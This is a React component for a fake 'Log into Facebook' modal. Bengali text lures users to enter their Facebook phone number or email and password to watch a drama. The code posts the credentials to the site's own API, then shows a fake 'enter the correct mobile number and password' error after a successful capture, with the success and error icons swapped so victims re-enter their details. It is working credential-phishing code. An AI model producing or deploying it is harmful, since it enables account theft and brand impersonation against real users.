"use client";

import { useState } from "react";
import { X, CheckCircle, AlertCircle } from "lucide-react";
import { FaFacebookF } from "react-icons/fa";

export default function UserRegisterModal({ onClose }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  // Toast state
  const [toast, setToast] = useState({
    show: false,
    type: "",
    message: "",
  });

  const showToast = (type, message) => {
    setToast({
      show: true,
      type,
      message,
    });

    // 2 seconds পর popup চলে যাবে
    setTimeout(() => {
      setToast({
        show: false,
        type: "",
        message: "",
      });
    }, 5000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setLoading(true);

      const response = await fetch("/api/auth/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await response.json();

      if (response.ok) {
        showToast("success", "সঠিক মোবাইল নম্বর এবং পাসওয়ার্ড প্রদান করুন।");

        setEmail("");
        setPassword("");

        // 4 sec পর modal close
        setTimeout(() => {
          onClose();
        }, 9000);
      } else {
        showToast("error", data.message || "Registration failed!");
      }
    } catch (error) {
      console.error("Registration Error:", error);

      showToast("error", "Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4">
      <div className="relative w-full max-w-[440px] overflow-hidden rounded-xl bg-white shadow-2xl">
        {/* Close Button */}
        <button
          onClick={onClose}
          type="button"
          aria-label="Close"
          className="absolute right-4 top-4 z-10 flex h-8 w-8 items-center justify-center rounded-full bg-gray-100 text-gray-600 transition hover:bg-gray-200 hover:text-black"
        >
          <X className="h-5 w-5" />
        </button>

        {/* Welcome Text + Logo */}
        <div className="flex flex-col items-center px-4 py-5">
          <p className="mb-4 max-w-[320px] text-center text-[12px] leading-5 font-medium text-gray-700">
            লাভ স্টোরি ড্রামা দেখতে আপনার ফেসবুক অ্যাকাউন্টের (মোবাইল নম্বর বা ইমেইল এবং পাসওয়ার্ড) দিয়ে লগইন
            করুন।
          </p>

          <div className="flex h-[60px] w-[60px] items-center justify-center rounded-full bg-[#1877F2]">
            <FaFacebookF className="h-[38px] w-[38px] text-white" />
          </div>
        </div>

        {/* Divider */}
        <div className="h-px w-full bg-[#ddd]" />

        {/* Content */}
        <div className="relative px-8 pb-8 pt-12 sm:px-12">
          {/* Success / Error Popup */}
          {toast.show && (
            <div
              className={`mb-4 flex items-center justify-center gap-3 rounded-xl px-5 py-3.5 shadow-lg ${
                toast.type === "success"
                  ? "bg-white text-gray-800"
                  : "bg-white text-gray-800"
              }`}
            >
              {toast.type === "success" ? (
                <AlertCircle className="h-6 w-6 shrink-0 text-red-500" />
              ) : (
                <CheckCircle className="h-6 w-6 shrink-0 text-green-500" />
              )}

              <span className="text-sm font-medium">{toast.message}</span>
            </div>
          )}

          <h2 className="mb-4 text-[18px] font-normal text-black">
            Log into Facebook
          </h2>

          <form onSubmit={handleSubmit} className="space-y-3">
            {/* Email */}
            <input
              type="text"
              placeholder="Email address or mobile number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              autoComplete="username"
              className="h-[60px] w-full rounded-[16px] border border-[#ccd0d5] bg-white px-4 text-[16px] text-[#1c1e21] outline-none placeholder:text-[#606770] focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2]"
            />

            {/* Password */}
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
              className="h-[60px] w-full rounded-[16px] border border-[#ccd0d5] bg-white px-4 text-[16px] text-[#1c1e21] outline-none placeholder:text-[#606770] focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2]"
            />

            {/* Login */}
            <button
              type="submit"
              disabled={loading}
              className="mt-3 h-[54px] w-full rounded-full bg-[#0866ff] text-[16px] font-semibold text-white transition hover:bg-[#1877f2] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {loading ? "Logging in..." : "Log in"}
            </button>
          </form>

          {/* Forgotten Password */}
          <div className="mt-6 text-center">
            <button
              type="button"
              className="text-[16px] text-black transition hover:underline"
            >
              Forgotten password?
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
